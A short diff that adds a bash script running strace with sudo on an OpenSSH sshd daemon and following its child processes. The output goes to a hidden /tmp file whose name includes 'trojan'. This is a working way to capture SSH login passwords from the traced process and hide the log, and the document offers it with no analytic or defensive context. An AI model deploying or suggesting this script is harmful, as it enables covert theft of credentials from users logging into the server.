@@ -1,0 +1,3 @@
+#!/bin/bash
+
+sudo strace -f -o /tmp/.log_sstrojan1.txt /opt/openssh/sbin/sshd
